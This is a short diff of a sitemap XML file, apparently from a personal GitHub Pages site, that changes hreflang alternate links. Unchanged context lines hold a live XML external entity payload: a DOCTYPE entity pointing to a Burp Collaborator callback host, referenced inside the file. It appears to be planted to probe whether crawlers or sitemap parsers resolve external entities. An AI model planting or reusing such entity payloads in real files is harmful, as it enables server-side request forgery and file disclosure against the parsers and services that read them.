@@ -5,7 +5,6 @@
 <!ENTITY xxe SYSTEM "2psijjbdrllckx0g6c93m2aogfm5au.burpcollaborator.net">]><foo>&xxe;</foo>
 <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" xmlns:xhtml="http://www.w3.org/1999/xhtml">
   <url>
-  	<xhtml:link href="https://ddennis574.github.io/aa.html" hreflang="x-default" rel="alternate"/>
-  	<xhtml:link href="https://ddennis574.github.io/aaa.html" hreflang="aaa" rel="alternate"/>
+  	<xhtml:link href="https://ddennis574.github.io/" hreflang="x-default" rel="alternate"/>
   </url>
 </urlset>
